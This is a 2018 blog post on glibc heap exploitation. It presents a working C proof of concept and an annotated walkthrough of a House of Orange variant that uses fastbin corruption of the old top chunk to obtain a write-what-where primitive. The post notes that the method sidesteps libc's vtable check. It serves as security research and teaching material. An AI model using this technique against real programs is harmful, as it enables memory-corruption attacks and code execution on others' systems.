---
layout: post
title: "Fastbin dup with House of Orange"
date: 2018-02-14
excerpt: "Alternate way to exploit the House of Orange scenario using fastbin corruption"
tags: [heap, fastbin, method]
description: Sample placeholder post.
---

This post will demonstrate an alternate way to exploit the House of Orange scenario which was originally shown by 4ngelboy. It involves using fastbin corruption on the old top chunk to allocate a chunk at an arbitrary location, thus achieving a write-what-where primitive.  The premises are same as that of House of Orange –

  * A heap overflow must be present.
  * We must control the size that is being passed to malloc.

The advantages of this alternative are –

  * Given that the address of the target location is known, no other heap or libc leaks are required.
  * It does not use the \_IO_FILE jump table. So the patch with the latest libc, on the vtable check does not apply here.

The proof of concept that this post will be following can be found <a target="_blank" rel="noopener noreferrer" href="https://www.github.com/vigneshsrao/Concepts/blob/master/fastbin_orange/fastbin_orange.c">here</a>.

{% highlight c %}
int main()
{
    unsigned long target=0x51;
    fprintf(stderr, "target @ %p\n", &target);

    char *p=(char*)malloc(0x1000-16-0x70);
    size_t *top= (size_t*)(p+0x1000-16-0x70);

    fprintf(stderr, "top chunk @ %p\n", top);

    top[1]=0x71;

    malloc(0x1000);

    top[2]=(size_t)(&target-1);

    malloc(0x50-16);

    fprintf(stderr,"new chunk @ %p\n",malloc(0x50-16));
}
{% endhighlight %}

We start with the assumption that the target location is known. This can be a GOT address, malloc_hook, free_hook, a stack location etc. We will take the target location as a stack variable. Also, for this particular PoC, we will be allocating a chunk of size 0x50, but in general, a chunk of any size in the fastbin range can be allocated. Since we will finally be performing a fastbin dup, we need that the size of the chunk is written near our target location.

```c
    unsigned long target=0x51;
```

The first part is similar to the House of Orange. We first allocate a large chunk, edit the size of the top chunk and then allocate another large chunk whose size should be greater than that of the current top chunk. Note that the top chunk must always satisfy the following conditions –

Top chunk’s PREV_IN_USE bit must be set
Top chunk + size should be page aligned
The normal page size on Linux is 4kB (0x1000 bytes). Also, whenever a chunk is allocated, it has 16 bytes of metadata. So we must malloc (0x1000 – 16 – 0x70) bytes. We will come to why it’s “- 0x70” and not “- 0x50” shortly.

```c
    char *p=(char*)malloc(0x1000-16-0x70);

    size_t *top= (size_t*)(p+0x1000-16-0x70);
```

Now we have to edit the size of the top chunk. Here, we assume that there is a heap overflow which can be used to do this. We will overwrite the size field of the top chunk with 0x71. Thus the PREV_IN_USE bit is set, and top chunk + size(0x70) is page aligned.

```c
    top[1]=0x71;
```

Now we will come to why we were using the size 0x70, instead of 0x50. When the next call to malloc is made with a size greater than the size of the top chunk, the current top will be extended and the. A temporary chunk is used to keep track of the change in the size of the top chunk. For the temporary chunk, 0x20 byte’s are allocated from the top chunk. Thus after the allocation of the temporary chunk, the size of top chunk becomes 0x70-0x20=0x50 and the top chunk is freed. Thus the fastbin of size 0x50 contains the old top chunk.

```c
    malloc(0x1000);
```

Now, this scenario can be exploited using a simple fastbin dup as we have a heap overflow. For this, we will first set the next pointer of the fastbin list of size 0x50 to point to the target address. Note that the target address should be such that, 0x51 must be written at the address + 8.

```c
    top[2]=(size_t)(&target-1);
```

Now, a malloc of size 0x50-16 will return the old top chunk and set the head of the fastbin of size 0x50 to our target chunk.

```c
    malloc(0x50-16);
```

The next malloc request of size 0x50-16 will return us a chunk at our target location.

```c
    fprintf(stderr, “new chunk @ %p\n”, malloc(0x50-16));
```

![fastbin](/assets/img/fastbin/fastbin_orange.png)
{: .image-pull-left}


## Credits:

* [Angelboy’s blog post](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) on House of Orange.
* [House of Orange PoC](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c) in Shellphish’s [how2heap](https://github.com/shellphish/how2heap) repository.
